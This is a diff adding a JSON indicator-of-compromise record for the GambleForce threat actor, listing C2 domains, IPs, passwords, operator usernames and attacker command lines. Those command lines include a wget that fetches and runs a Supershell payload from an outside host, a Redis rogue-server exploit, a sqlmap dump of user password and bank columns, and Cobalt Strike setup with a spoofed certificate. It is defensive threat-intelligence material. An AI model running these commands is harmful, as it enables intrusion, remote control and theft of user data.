@@ -1,0 +1,307 @@
+{
+  "malware_family": "GambleForce",
+  "threat_actor": "GambleForce",
+  "platforms": [
+    "web",
+    "linux",
+    "windows"
+  ],
+  "summary": "GambleForce is a threat actor active since September 2023, primarily using SQL injection attacks against organizations in the APAC region. They leverage a set of public open-source tools including sqlmap, dirsearch, and a customized Cobalt Strike instance for C2. The group has successfully exfiltrated user databases from gambling, retail, travel, and government websites.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "python redis-master.py -r [targetip] -p 6379 -L 212.60.5.129 -P 21000 -f RedisModulesSDK/exp.so -c \"whoami\"",
+      "context": "Execution of redis-rogue-getshell exploit.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "redis-rogue-getshell",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sqlmap -r /root/tools/1111.txt --technique=U -D [victimdatabasename] -T [victimtablename] -C mb_id,mb_name,mb_password,mb_hp,mb_realname,mb_bank_name,mb_bank_no --dump",
+      "context": "Sqlmap dumping specific table columns from a victim database.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "sqlmap",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wget http://38.54.40.156:8888/supershell/compile/download/linuxamdx64 -O /var/tmp/.caches && chmod +x /var/tmp/.caches && /var/tmp/.caches",
+      "context": "Download and execute of Chinese supershell framework.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "supershell",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./teamserver 212.60.5.129 qwertyuiop123 cs2.profile",
+      "context": "Cobalt Strike teamserver startup command.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "keytool -keystore CobaltStrikepro.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias windows.updates.wiki -dname \"CN=Microsec e-Szigno Root CA, OU=e-Szigno CA, O=Microsec Ltd., L=Budapest, S=HU, C=HU\"",
+      "context": "Generating a self-signed certificate for Cobalt Strike.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/root/tools/1111.txt",
+      "context": "Sqlmap request file on C&C server.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/.caches",
+      "context": "Downloaded supershell payload location.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "cs2.profile",
+      "context": "Cobalt Strike Malleable C2 profile name.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "cs.store",
+      "context": "Cobalt Strike keystore specified in malleable profile.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "CobaltStrikepro.store",
+      "context": "Keystore for generated Cobalt Strike certificate.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "qwertyuiop123",
+      "context": "Password for Cobalt Strike teamserver and keystore.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "nmgb",
+      "context": "Cobalt Strike operator username.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "neo2323",
+      "context": "Cobalt Strike operator username.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "sbsbsb22",
+      "context": "Cobalt Strike operator username.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "CN=Microsec e-Szigno Root CA, OU=e-Szigno CA, O=Microsec Ltd., L=Budapest, S=HU, C=HU",
+      "context": "Subject for self-signed CS certificate, mimicking Microsec.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "Dns-supports.online",
+      "context": "Cobalt Strike C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "Windows.updates.wiki",
+      "context": "Cobalt Strike C2 domain and certificate alias.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "212.60.5.129",
+      "context": "C&C server; Cobalt Strike teamserver IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.54.40.156",
+      "context": "Server hosting supershell payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "37.128.246.50",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.60.220.230",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "130.162.156.51",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.104.113.179",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "123.118.226.80",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.104.51.37",
+      "context": "Operator IP for Cobalt Strike panel login.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://38.54.40.156:8888/supershell/compile/download/linuxamdx64",
+      "context": "URL for downloading supershell payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "supershell"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/1",
+      "context": "Cobalt Strike x86 stager URI.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/2",
+      "context": "Cobalt Strike x64 stager URI.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/3",
+      "context": "Cobalt Strike HTTP GET C2 URI.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/4",
+      "context": "Cobalt Strike HTTP POST C2 URI.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "http_header",
+      "value": "Host: www.dns-supports.online",
+      "context": "Cobalt Strike C2 Host header.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    },
+    {
+      "kind": "http_header",
+      "value": "Cookie",
+      "context": "HTTP header used for Cobalt Strike C2 metadata.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Cobalt Strike"
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "elf",
+    "script"
+  ]
+}
